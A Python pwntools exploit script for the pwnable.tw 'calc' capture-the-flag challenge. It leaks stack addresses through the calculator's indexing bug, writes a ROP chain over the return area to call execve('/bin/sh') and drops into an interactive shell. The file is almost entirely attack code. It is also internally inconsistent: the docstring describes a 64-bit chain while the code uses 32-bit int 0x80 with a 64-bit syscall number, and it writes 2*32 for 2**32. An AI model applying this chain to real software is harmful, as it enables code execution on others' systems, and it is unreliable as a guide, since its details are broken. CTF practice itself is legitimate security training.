from pwn import *



#r = remote('chall.pwnable.tw',10100)
r = process('./calc')

'''

    syscall system:
        rax = 0x3b
        rdi = ptr to "/bin/sh" ()
        rsi = 0
        rdx = 0

    ROPgadget:
        stack[0]: 0x4725a7
            pop     rax
            retn
        stack[1]: 0x3b
        stack[2]: 0x446e35
            pop     rdx
            ret
        stack[2]: &stack[10]
        stack[4]: 0x4576de   
            pop     rsi
            ret
        stack[5]: &stack[10]
        stack[6]: 0x47dce5  
            pop     rdi
            ret
        stack[7]: &stack[9]
        stack[8]: 0x47ab31
            syscall
        stack[9]: '\bin\sh\x00
        stack[10]:  0x0
'''


def exp(id, gadget):
    r.sendline("+{}".format(str(id)))
    leak = int(r.recvline().strip())
    if (leak < 0):
        leak = (leak-(2*32))*-1
    print("before: ", hex(leak))
    
    offset = gadget - leak
    if gadget < 0xf0000000:
        offset *= -1
    if offset <  0:
        r.sendline("+{}{}".format(str(id), str(offset)))
    elif offset > 0:
        r.sendline("+{}+{}".format(str(id), str(offset)))

    leak = int(r.recvline().strip())
    if (leak < 0):
        leak = (leak-(2*32))*-1
    print("\t\t\t\t\tafter: ", hex(leak))

r.recvline()

stack_id_start = 361
# stack_id_end = 
# exp(361, 0x804947b) # main

r.sendline("+360") # at stack 
rop_start = int(r.recvline().strip()) + (2**32) - 0x1c
print("rop_start at: ", hex(rop_start))
pause()



exp(361, 0x80e398d) # pop eax
exp(362, 0x3b)
exp(363, 0x80701aa) # pop edx
exp(364, 0x80ed000) # some empty place
exp(365, 0x80acefd) # pop esi
exp(366, 0x80ed000) # some empty place
exp(367, 0x80935ef) # pop edi
exp(368, rop_start + 4*9) 
exp(369, 0x8049a21) # int 0x80
exp(370, 0x6e69622f)
exp(371, 0x68732f)
pause()
pause()

r.sendline("") # trigger return







r.interactive()
